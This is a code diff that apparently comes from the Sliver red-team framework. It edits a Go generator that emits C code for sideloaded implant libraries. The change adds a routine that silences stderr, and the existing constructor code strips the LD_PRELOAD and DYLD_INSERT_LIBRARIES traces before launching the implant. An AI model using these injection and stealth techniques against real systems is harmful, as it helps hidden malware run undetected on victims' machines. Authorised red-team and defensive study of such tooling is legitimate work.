@@ -1114,11 +1114,20 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	// (EntryPoint is ignored on those platforms). See https://sliver.sh/docs/?name=Third+Party+Tools
 	if cfg.Sideload {
 		b.WriteString(`/*
+#include <fcntl.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-//export Run
 extern void Run(char*);
+
+static void sliver_silence_stderr(void)
+{
+	int dn = open("/dev/null", O_WRONLY);
+	if (dn >= 0) {
+		dup2(dn, STDERR_FILENO);
+		close(dn);
+	}
+}
 
 #if defined(__linux__)
 static void sliver_sideload_init(int argc, char **argv, char **envp)
@@ -1127,6 +1136,7 @@ static void sliver_sideload_init(int argc, char **argv, char **envp)
 	unsetenv("LD_PRELOAD");
 	char *params = getenv("LD_PARAMS");
 	unsetenv("LD_PARAMS");
+	sliver_silence_stderr();
 	Run(params);
 	_exit(0);
 }
@@ -1138,6 +1148,7 @@ __attribute__((constructor)) static void sliver_sideload_init(int argc, char **a
 	unsetenv("DYLD_INSERT_LIBRARIES");
 	char *params = getenv("LD_PARAMS");
 	unsetenv("LD_PARAMS");
+	sliver_silence_stderr();
 	Run(params);
 	_exit(0);
 }
